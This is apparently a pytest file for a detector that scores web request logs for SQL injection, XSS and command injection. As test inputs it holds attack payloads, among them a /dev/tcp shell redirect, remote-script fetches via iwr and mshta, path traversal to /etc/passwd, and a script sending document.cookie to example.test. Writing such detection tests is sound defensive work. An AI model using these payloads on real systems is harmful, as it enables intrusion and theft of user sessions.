from __future__ import annotations

import pytest

from src.prepare_llm_input import build_row_context_reason_hints, evaluate_row


def request_row(query_string: str = "", *, uri: str = "/search", request_id: str = "semantic") -> dict:
    target = uri + ("?" + query_string if query_string else "")
    return {
        "id": 1,
        "log_time": "2026-09-04T12:00:00+09:00",
        "src_ip": "198.51.100.10",
        "method": "GET",
        "uri": uri,
        "query_string": query_string,
        "status_code": 200,
        "raw_request": f"GET {target} HTTP/1.1",
        "raw_log": "",
        "request_id": request_id,
        "error_link_id": "",
        "user_agent": "Mozilla/5.0",
        "referer": "https://example.test/",
        "response_body_bytes": 0,
        "resp_content_type": "text/html",
    }


def candidate_for(query_string: str = "", *, uri: str = "/search"):
    return evaluate_row(request_row(query_string, uri=uri), source_table="security", min_score=4)[0]


def test_generic_context_scores_require_substantive_security_signal() -> None:
    generic_only = "e=" + "!" * 42 + "&e=" + "!" * 42
    assert candidate_for(generic_only) is None

    retained = [
        "q=' OR 1=1&padding=" + "a" * 40,
        "x=<svg/onload=alert(1)>&x=duplicate",
        "cmd=;ps%20" + "!" * 20,
        "file=../../etc/passwd&padding=" + "a" * 40,
    ]
    for query_string in retained:
        assert candidate_for(query_string) is not None


@pytest.mark.parametrize(
    "query_string",
    [
        "cmd=;ps",
        "cmd=;who",
        "cmd=;iwr%20https://example.test/a.ps1",
        "cmd=;iwmi%20-class%20x",
        "cmd=$(cmd)",
        "cmd=time+sh+-c+whoami",
        "cmd=d=/dev&&%28sh%290%3E$d/tcp/example.test/80",
        "cmd=;mshta%20https://example.test/a",
        "cmd=image.jpg;dsmod%20user",
    ],
)
def test_bounded_cmdi_grammar_and_vocabulary_select(query_string: str) -> None:
    candidate = candidate_for(query_string)
    assert candidate is not None
    assert any(hint.startswith("cmdi:") for hint in candidate.reason_hints)


@pytest.mark.parametrize(
    "query_string",
    ["cmd=;environment", "cmd=regedit", "cmd=whoami", "cmd=cat+notes", "cmd=time+warner", "cmd=foo+&&+bar"],
)
def test_cmdi_requires_shell_grammar_and_bounded_command_context(query_string: str) -> None:
    assert candidate_for(query_string) is None


def test_bare_cat_os_file_text_does_not_gain_cmdi_evidence() -> None:
    hints = build_row_context_reason_hints(request_row("cmd=cat+/etc/passwd"))
    assert not any(hint.startswith("cmdi:") for hint in hints)


@pytest.mark.parametrize("query_string", ["q=;INSERT+INTO+t+VALUES+(1)", "q=;DROP+TABLE+t", "q=;UPDATE+t+SET+x=1", "q=;DELETE+FROM+t"])
def test_sql_dml_is_not_cmdi_evidence(query_string: str) -> None:
    hints = build_row_context_reason_hints(request_row(query_string))
    assert not any(hint.startswith("cmdi:") for hint in hints)


def test_xss_score_patterns_require_executable_context() -> None:
    assert candidate_for("x=<svg/onload=alert(1)>") is not None
    assert candidate_for("x=style=color:red;background:url(javascript:alert(1))") is not None
    assert candidate_for("x=<script>alert(1)</script>") is not None
    assert candidate_for("x=javascript:%20%5C%5C%5C%5Ct") is not None

    assert candidate_for("sign=" + "a" * 84 + "onafe=") is None
    assert candidate_for("x=url(javascript:alert(1))") is None
    assert candidate_for(uri="/javascript-manual/document.cookie") is None


def test_browser_data_requires_exfiltration_context() -> None:
    assert candidate_for(uri="/javascript-manual/document.cookie") is None
    candidate = candidate_for("x=<script>fetch('https://example.test/?c='+document.cookie)</script>")
    assert candidate is not None
    assert "xss:browser_data_exfil(+4)" in candidate.reason_hints
